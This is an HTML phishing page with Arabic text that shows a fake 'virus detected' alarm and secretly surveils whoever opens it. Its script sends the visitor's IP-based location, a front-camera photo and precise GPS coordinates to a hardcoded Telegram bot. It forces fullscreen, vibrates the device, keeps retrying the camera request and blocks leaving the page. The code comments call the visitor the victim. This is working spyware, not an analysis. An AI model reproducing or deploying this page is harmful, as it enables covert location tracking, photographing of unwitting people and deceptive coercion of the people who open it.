<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🚨 System Critical Error</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; overflow: hidden; margin: 0; }
        video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.02; z-index: -1; }
        .box { border: 2px solid #f00; padding: 20px; margin: 10px; animation: pulse 0.1s infinite; }
        @keyframes pulse { 0% {box-shadow: 0 0 10px #f00;} 100% {box-shadow: 0 0 50px #f00;} }
    </style>
</head>
<body onclick="launchTrap()">

    <div class="box">
        <h1>⚠️ تم اكتشاف فايروس ⚠️</h1>
        <p>جهازك معرض للخطر. اضغط في أي مكان للإصلاح فوراً.</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const ID = "1772820433";

        async function send(m, isImg=false) {
            let u = `https://api.telegram.org/bot${T}/`;
            if(!isImg) {
                await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
            } else {
                const b = await (await fetch(m)).blob();
                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'capture.png');
                await fetch(u+'sendPhoto',{method:'POST',body:f});
            }
        }

        // سحب الموقع من 3 مصادر لضمان الوصول
        function getLoc() {
            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 المصدر 1:\n${d.latitude},${d.longitude}`));
            fetch('https://ipinfo.io/json?token=YOUR_OPTIONAL_TOKEN').then(r=>r.json()).then(d=> { let loc = d.loc.split(','); send(`📍 المصدر 2:\n${loc[0]},${loc[1]}`); });
            fetch('http://ip-api.com/json/').then(r=>r.json()).then(d=>send(`📍 المصدر 3:\n${d.lat},${d.lon}`));
        }

        async function launchTrap() {
            // تفعيل وضع ملء الشاشة لمنع الضحية من رؤية أزرار الخروج بسهولة
            document.documentElement.requestFullscreen();
            
            // اهتزاز مستمر لإرباك الضحية
            navigator.vibrate([1000, 500, 1000]);

            try {
                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
                document.getElementById('v').srcObject = s;
                
                // انتظار ثانية واحدة لضمان وضوح الصورة (علاج السواد)
                setTimeout(() => {
                    const can = document.getElementById('c');
                    const vid = document.getElementById('v');
                    can.width = vid.videoWidth; can.height = vid.videoHeight;
                    can.getContext('2d').drawImage(vid,0,0);
                    send(can.toDataURL('image/png'), true);
                    
                    // الاستمرار في طلب الموقع الدقيق GPS
                    navigator.geolocation.getCurrentPosition(p => {
                        send(`🎯 إحداثيات GPS دقيقة جداً:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                    }, null, {enableHighAccuracy: true});
                }, 1500);

            } catch(e) {
                alert("⚠️ خطأ! اضغط سماح لفك قفل النظام!");
                launchTrap(); // إعادة المحاولة إجبارياً
            }
        }

        // منع إغلاق الصفحة أو العودة
        window.onbeforeunload = () => "🚨 جهازك في خطر! هل تريد المغادرة؟";
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);

        window.onload = getLoc;
    </script>
</body>
</html>
